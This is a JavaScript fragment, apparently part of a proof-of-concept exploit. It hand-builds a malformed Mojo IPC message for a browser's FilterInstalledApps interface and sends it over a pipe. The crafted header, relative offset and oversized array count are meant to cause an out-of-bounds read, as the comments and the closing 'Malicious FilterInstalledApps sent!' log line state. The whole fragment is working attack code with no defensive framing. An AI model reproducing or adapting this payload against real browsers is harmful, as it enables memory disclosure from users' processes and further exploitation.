            const payload = new ArrayBuffer(256);
            const v = new DataView(payload);

            // Mojo message header (16 bytes)
            v.setUint32(0, 2, true);          // version
            v.setUint32(4, 0, true);          // flags
            v.setUint32(8, 0, true);          // ordinal = 0 (FilterInstalledApps)
            v.setUint32(12, 0, true);         // request_id

            // Payload layout (starting at offset 16) as expected by FUN_184cc1aa0:
            // offset 16: uint32 ? (ignored)
            // offset 20: uint32 count (must be >= 2 to trigger pointer arithmetic)
            // offset 24: uint64 relative_offset
            v.setUint32(20, 2, true);         // count = 2
            // Relative offset = target - (puVar1 + 8) = 0x52 - (16+8) = 0x52 - 0x18 = 0x3A
            v.setBigInt64(24, BigInt(0x3A), true);

            // The computed array pointer will be: puVar1 + offset + 0x20 = 16 + 0x3A + 0x20 = 0x70
            // At offset 0x70 we place a huge array count (e.g., 0x1000)
            v.setUint32(0x70, 0x1000, true);   // huge number of apps → out‑of‑bounds read

            // 4. Send the raw message (no handles)
            pipe.writeMessage(payload, []);
            log('Malicious FilterInstalledApps sent!');
